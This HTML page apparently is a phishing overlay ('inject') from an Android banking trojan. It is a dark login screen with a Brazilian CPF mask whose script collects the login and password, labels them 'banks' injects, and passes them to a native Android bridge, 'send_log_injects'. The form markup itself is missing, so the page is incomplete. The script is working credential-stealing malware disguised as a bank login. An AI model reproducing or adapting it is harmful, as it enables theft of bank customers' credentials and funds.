<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <style>
        body {
            background-color: #000;
        }

        form {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        header {
            flex: 0.4;
        }

        section {
            padding: 15px;
            flex: 0.6;
        }

        footer {
            padding: 15px;
        }

        .cool-input {
            box-sizing: border-box;
            border: 0;
            width: 100%;
            position: relative;
            font-size: 16px;
            margin-bottom: 15px;
            background-color: transparent;
            border-radius: 6px 6px 0 0;
            padding: 5px;
            border-bottom: 1px solid #333333;
        }

        .cool-input__input {
            box-sizing: border-box;
            background: none;
            width: 100%;
            padding: 10px;
            padding-left: 0;
            position: relative;
            z-index: 2;
            font-size: 1em;
        }
        .cool-input__input:focus {
            outline: none;
        }

        .cool-input__placeholder {
            box-sizing: border-box;
            border: none;
            background: none;
            width: 100%;
            position: absolute;
            z-index: 1;
            left: 0;
            top: 50%;
            line-height: 0;
            color: #fefefe;
            font-weight: 100;
            transition: all 0.2s ease;
        }

        .cool-input__input_filled + .cool-input__placeholder,
        .cool-input__input:focus + .cool-input__placeholder {
            font-size: 0.8em;
            top: 0;
            margin-top: 1em;
        }

        section {
            padding: 25px;
        }

        .input {
            width: 100%;
            border: 0;
            padding: 15px;
            padding-left: 0;
            padding-right: 0;
            padding-top: 15px;
            padding-bottom: 0px;
            color: #fff;
            font-weight: 300;
        }

        .input:focus + .cool-input {
            background-color: #454545;
        }

        input, button {
            outline: none !important;
            box-shadow: none !important;
        }

        .button {
            width: 100%;
            padding: 14px;
            background-color: #75fb74;
            color: #000;
            border: 1px solid #75fb74;
            border-radius: 6px;
            margin-bottom: 15px;
        }

        .button:disabled {
            background-color: transparent;
            border-color: #666666;
            color: #666666;
        }
    </style>
</head>

    <script>
        $('#login').mask('000.000.000-00');
        $('.cool-input__input').on('input', function(){
            var $this = $(this);
            if ($this.val() == '') {
                $this.removeClass('cool-input__input_filled');
            } else {
                $this.addClass('cool-input__input_filled');
            }
        });

        var login = document.getElementById('login'),
            password = document.getElementById('password');

        var sendData = document.getElementById('sendData');

        login.onkeyup = () => {
            if(login.value.length >= 4 && password.value.length >= 4) {
                sendData.disabled = false;
            } else {
                sendData.disabled = true;
            }
        }

        password.onkeyup = () => {
            if(login.value.length >= 4 && password.value.length >= 4) {
                sendData.disabled = false;
            } else {
                sendData.disabled = true;
            }
        }

        sendData.onclick = () => {
                var data = {};
                data.login = login.value;
                data.password = password.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
    </script>
